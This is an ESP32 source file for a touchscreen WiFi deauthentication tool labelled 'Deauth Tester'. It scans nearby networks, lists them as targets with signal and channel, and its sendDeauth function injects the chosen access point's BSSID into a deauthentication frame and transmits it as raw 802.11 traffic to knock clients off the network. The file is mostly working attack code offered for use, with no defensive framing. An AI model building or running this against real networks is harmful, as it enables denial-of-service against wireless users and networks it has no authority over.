#include "deauth.h"
#include "ui.h"

void drawTargetList() {
  tft.fillRect(0, 45, TFT_W, 175, COL_BG);
  tft.setTextSize(1);
  int shown = min(targetCount, 10);
  for (int i = 0; i < shown; i++) {
    uint16_t col = (i == selectedTarget) ? COL_ACCENT : COL_TEXT;
    tft.setTextColor(col, COL_BG);
    tft.setCursor(4, 50 + i*18);
    tft.printf("%s%-14s ch%02d %4ddBm",
               i == selectedTarget ? ">" : " ",
               targets[i].ssid.substring(0,12).c_str(),
               targets[i].channel,
               targets[i].rssi);
  }
  if (targetCount == 0) {
    tft.setTextColor(COL_ACCENT2, COL_BG);
    tft.setCursor(4, 50);
    tft.print("No targets -- tap Scan");
  }
}

void drawDeauthScreen() {
  drawHeader("Deauth Tester");
  drawButton(10,  226, 105, 36, "Scan");
  drawButton(125, 226, 105, 36, "Select");
  drawButton(10,  270, 105, 40,
             deauthing ? "STOP" : "START",
             deauthing ? COL_RED : COL_BTN);
  drawButton(125, 270, 105, 40, "< Back");
  drawTargetList();
}

void scanForTargets() {
  drawStatus("Scanning...", COL_WARN);
  WiFi.mode(WIFI_STA);
  int n = WiFi.scanNetworks();
  targetCount    = min(n, 20);
  selectedTarget = targetCount > 0 ? 0 : -1;
  for (int i = 0; i < targetCount; i++) {
    targets[i].ssid    = WiFi.SSID(i);
    targets[i].rssi    = WiFi.RSSI(i);
    targets[i].channel = WiFi.channel(i);
    memcpy(targets[i].bssid, WiFi.BSSID(i), 6);
  }
  drawStatus(targetCount ? "Scan done" : "No networks found",
             targetCount ? COL_GREEN : COL_RED);
  delay(800);
  drawDeauthScreen();
}

void sendDeauth(int idx) {
  if (idx < 0 || idx >= targetCount) return;
  memcpy(&deauthPacket[10], targets[idx].bssid, 6);
  memcpy(&deauthPacket[16], targets[idx].bssid, 6);
  esp_wifi_set_channel(targets[idx].channel, WIFI_SECOND_CHAN_NONE);
  esp_wifi_80211_tx(WIFI_IF_STA, deauthPacket, sizeof(deauthPacket), false);
}
